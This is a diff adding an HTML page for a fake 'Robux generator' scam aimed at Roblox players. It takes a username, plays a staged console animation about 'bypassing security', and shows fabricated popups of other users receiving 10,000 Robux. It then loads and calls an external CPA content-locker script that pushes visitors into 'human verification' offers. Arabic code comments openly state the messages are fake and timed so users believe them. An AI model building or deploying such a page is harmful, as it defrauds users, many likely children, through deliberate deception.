@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔓 ROBUX GENERATOR • FREE 10,000 ROBUX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script type="text/javascript">
+        var oAzgp_crp_nknADc = {"it":4602875,"key":"b0444"};
+    </script>
+    <script src="https://d19k1sh57v5k0g.cloudfront.net/6be15ec.js"></script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            /* خلفية مستوحاة من ألوان Roblox مع تمويه */
+            background: linear-gradient(135deg, #111424, #0b0d17);
+            font-family: 'Montserrat', sans-serif;
+            overflow-x: hidden;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+            width: 100%;
+        }
+
+        /* كارد رئيسي أكثر نظافة */
+        .glass-card {
+            background: rgba(20, 24, 44, 0.85);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            padding: 35px 25px;
+            transition: all 0.3s;
+        }
+
+        .roblox-icon { text-align: center; margin-bottom: 15px; }
+        .roblox-icon i {
+            font-size: 3.5rem;
+            color: #fff;
+            text-shadow: 0 0 15px rgba(255,255,255,0.3);
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 5px;
+            letter-spacing: -0.5px;
+        }
+
+        .robux-amount {
+            font-size: 3rem;
+            font-weight: 900;
+            text-align: center;
+            color: #00b06f; /* اللون الأخضر يوحي بالنجاح والموافقة */
+            text-shadow: 0 0 20px rgba(0, 176, 111, 0.4);
+            margin-bottom: 25px;
+        }
+
+        /* الخطوة 1: إدخال البيانات */
+        #step1 { display: block; }
+        
+        .username-wrapper {
+            background: #090b14;
+            border-radius: 15px;
+            padding: 5px 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            border: 2px solid #2a2e4a;
+            transition: 0.3s;
+        }
+        .username-wrapper:focus-within { border-color: #00b06f; }
+        .username-wrapper i { color: #8892b0; font-size: 1.2rem; }
+        .username-wrapper input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 16px 0;
+            color: white;
+            font-weight: 600;
+            font-size: 1.1rem;
+            outline: none;
+        }
+
+        .cta-btn {
+            background: #00b06f;
+            border: none;
+            width: 100%;
+            border-radius: 15px;
+            padding: 18px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 10px 20px -5px rgba(0, 176, 111, 0.5);
+        }
+        .cta-btn:active { transform: scale(0.96); }
+
+        /* الخطوة 2: محاكاة المعالجة (مخفية في البداية) */
+        #step2 { display: none; text-align: center; }
+        
+        .console-box {
+            background: #090b14;
+            border-radius: 15px;
+            padding: 20px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #00ff00;
+            text-align: left;
+            margin-bottom: 20px;
+            height: 100px;
+            overflow: hidden;
+            position: relative;
+        }
+        #consoleText {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .progress-bar {
+            background: #2a2e4a;
+            border-radius: 20px;
+            height: 16px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #00b06f;
+            transition: width 0.3s ease;
+        }
+        .progress-label { font-weight: 700; font-size: 0.9rem; margin-bottom: 5px; }
+
+        .error-txt {
+            color: #ff4d4d; font-size: 0.8rem; margin-bottom: 15px; display: none; text-align: center; font-weight: 600;
+        }
+
+        /* شريط الإثبات الاجتماعي الحي (أسفل الشاشة) */
+        .live-activity {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.5s;
+            white-space: nowrap;
+        }
+        .live-activity i { color: #00b06f; }
+        
+        footer { text-align: center; font-size: 0.65rem; color: #556; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="glass-card">
+        <div class="roblox-icon">
+            <i class="fab fa-roblox"></i>
+        </div>
+        <h1>ROBUX GENERATOR</h1>
+        <div class="robux-amount">10,000 R$</div>
+
+        <div id="step1">
+            <div id="errorMsg" class="error-txt"></div>
+            <div class="username-wrapper">
+                <i class="fas fa-user"></i>
+                <input type="text" id="robloxUser" placeholder="Roblox Username" autocomplete="off">
+            </div>
+            <button class="cta-btn" id="startBtn">START GENERATOR</button>
+        </div>
+
+        <div id="step2">
+            <div class="console-box">
+                <div id="consoleText"></div>
+            </div>
+            <div class="progress-label" id="progressLabel">Connecting to server...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+    </div>
+    <footer>Not affiliated with Roblox Corp. Verification required.</footer>
+</div>
+
+<div class="live-activity" id="liveActivity">
+    <i class="fas fa-check-circle"></i>
+    <span id="activityText">User Player123 just generated 10,000 R$</span>
+</div>
+
+<script>
+    // --- عناصر الواجهة ---
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const userInput = document.getElementById('robloxUser');
+    const startBtn = document.getElementById('startBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    
+    // عناصر الكونسول الوهمي
+    const consoleText = document.getElementById('consoleText');
+    const progressFill = document.getElementById('progressFill');
+    const progressLabel = document.getElementById('progressLabel');
+
+    // --- رسائل الكونسول الوهمية لبناء الإثارة ---
+    const fakeConsoleMessages = [
+        "Connecting to Roblox API...",
+        "Searching for user: {user}...",
+        "User found! Attempting injection...",
+        "Bypassing security protocols...",
+        "Generating 10,000 Robux...",
+        "Saving data...",
+        "ERROR: Suspicious activity detected!",
+        "Human Verification Required."
+    ];
+
+    function showError(msg) {
+        errorMsg.style.display = 'block';
+        errorMsg.innerText = msg;
+        setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
+    }
+
+    // --- منطق زر البدء ---
+    startBtn.addEventListener('click', () => {
+        const username = userInput.value.trim();
+        if (username.length < 3) {
+            showError('Please enter a valid Roblox username.');
+            return;
+        }
+
+        // إخفاء الخطوة الأولى وإظهار الثانية
+        step1.style.display = 'none';
+        step2.style.display = 'block';
+
+        // بدء محاكاة المولد
+        runFakeGenerator(username);
+    });
+
+    // --- دالة المولد الوهمي ---
+    function runFakeGenerator(username) {
+        let step = 0;
+        let progress = 0;
+
+        const interval = setInterval(() => {
+            if (step < fakeConsoleMessages.length) {
+                // تحديث رسائل الكونسول
+                let msg = fakeConsoleMessages[step].replace('{user}', username);
+                const p = document.createElement('div');
+                p.innerText = "> " + msg;
+                if (msg.includes("ERROR")) p.style.color = "#ff4d4d";
+                if (msg.includes("Verification")) p.style.color = "#ffd700";
+                
+                consoleText.appendChild(p);
+                
+                // إبقاء السكرول في الأسفل
+                if (consoleText.children.length > 4) {
+                    consoleText.removeChild(consoleText.firstChild);
+                }
+
+                // تحديث شريط التقدم
+                progress += (100 / fakeConsoleMessages.length);
+                progressFill.style.width = progress + '%';
+                
+                if(progress < 100) {
+                    progressLabel.innerText = Math.floor(progress) + "% - Processing...";
+                }
+
+                step++;
+            } else {
+                clearInterval(interval);
+                progressLabel.innerText = "VERIFICATION REQUIRED!";
+                progressLabel.style.color = "#ff4d4d";
+                progressFill.style.background = "#ff4d4d";
+                
+                // استدعاء Content Locker بعد انتهاء المحاكاة بـ 1.5 ثانية
+                setTimeout(() => {
+                    if (typeof CPABuildLock === 'function') {
+                        CPABuildLock();
+                    } else {
+                        alert("Human Verification Required. Please disable AdBlock or refresh.");
+                    }
+                }, 1500);
+            }
+        }, 1200); // 1.2 ثانية بين كل رسالة (وقت كافٍ ليقرأها المستخدم ويصدقها)
+    }
+
+    // --- الإثبات الاجتماعي الحي (Live Social Proof) ---
+    const liveActivity = document.getElementById('liveActivity');
+    const activityText = document.getElementById('activityText');
+    const randomNames = ["Ghost_Rider", "Xx_Sniper_xX", "ProGamer99", "Sarah_Blox", "NinjaBoy22", "Shadow_Fiend", "Alex_King"];
+    
+    function showRandomActivity() {
+        const name = randomNames[Math.floor(Math.random() * randomNames.length)];
+        activityText.innerText = `User ${name} just generated 10,000 R$`;
+        
+        liveActivity.style.opacity = '1';
+        
+        setTimeout(() => {
+            liveActivity.style.opacity = '0';
+        }, 4000); // إخفاء بعد 4 ثوانٍ
+    }
+
+    // إظهار إشعار كل 8 إلى 15 ثانية
+    setInterval(() => {
+        showRandomActivity();
+    }, Math.floor(Math.random() * (15000 - 8000 + 1) + 8000));
+    
+    // تشغيل أول إشعار بعد 3 ثواني من دخول الصفحة
+    setTimeout(showRandomActivity, 3000);
+
+</script>
+</body>
+</html>
